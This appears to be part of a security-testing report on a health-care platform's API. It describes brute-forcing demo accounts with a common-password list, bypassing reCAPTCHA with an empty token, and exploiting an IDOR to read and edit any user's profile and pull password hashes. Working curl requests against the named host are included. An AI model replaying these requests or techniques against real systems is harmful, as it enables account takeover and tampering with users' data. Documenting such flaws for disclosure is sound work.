
---

## Brute-Force Testing of Demo Accounts (2026-03-04)

**Methodology:**
- Enumerated all demo accounts (demo1@gmail.com ... demo7@gmail.com).
- Attempted login on each using the following password list:
  123456, password, test123, admin, test, welcome, 12345678, 12345, 123, 123456789, password123, admin123, techpuram, demo
- Used the proven reCAPTCHA bypass (captchaToken: "") and no per-IP rate limiting.

**Results:**

| Email             | Successful Password(s) | JWT Acquired? |
|-------------------|-----------------------|--------------|
| demo1@gmail.com   | test123               | Yes          |
| demo2@gmail.com   | test123               | Yes          |
| demo3@gmail.com   | test123               | Yes          |
| demo4@gmail.com   | test123               | Yes          |
| demo5@gmail.com   | test123               | Yes          |
| demo6@gmail.com   | test123               | Yes          |
| demo7@gmail.com   | test123               | Yes          |

- All demo accounts reused the same password (test123) as cracked on the admin, confirming poor credential hygiene.

**Sample Login Request:**
```bash
curl -X POST 'https://api.wehealthtoday.com/api/auth-endpoints/login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"identifier":"demo1@gmail.com","password":"test123","captchaToken":""}'
```

**Sample Response (all accounts):**
```json
{
  "success": true,
  "role": "DOCTOR",  // varies by account
  "jwtToken": "<REDACTED>",
  "email": "demo1@gmail.com",
  "userId": 155,
  "failedCount": 0
}
```

---

## Post-authenticated Exploitation Results

**For all demo accounts:**
- Able to access `/api/users` and enumerate all users
- Able to access/modify any other user profile via `/api/users/:id` (IDOR)
- Able to download all password hashes
- Able to edit any user’s information (including admin and other demo accounts)
- Confirmed all previously described vulnerabilities are accessible from any demo account

**Example: Viewing other user’s profile:**
```bash
curl -X GET 'https://api.wehealthtoday.com/api/users/103' \
  -H "Authorization: Bearer <demo_jwtToken>"
```

**Example: Modifying other user’s profile:**
```bash
curl -X PUT 'https://api.wehealthtoday.com/api/users/103' \
  -H "Authorization: Bearer <demo_jwtToken>" \
  -H 'Content-Type: application/json' \
  --data-raw '{"firstName":"pwned"}'
```

All requests return user data/indicate update succeeded.

**Conclusion:**
- Any demo account grants full access to all user/user data in the system due to credential reuse and critical IDOR.
- An attacker could compromise any user, including admins, within seconds via brute force, even with the lowest-privileged demo account.

---
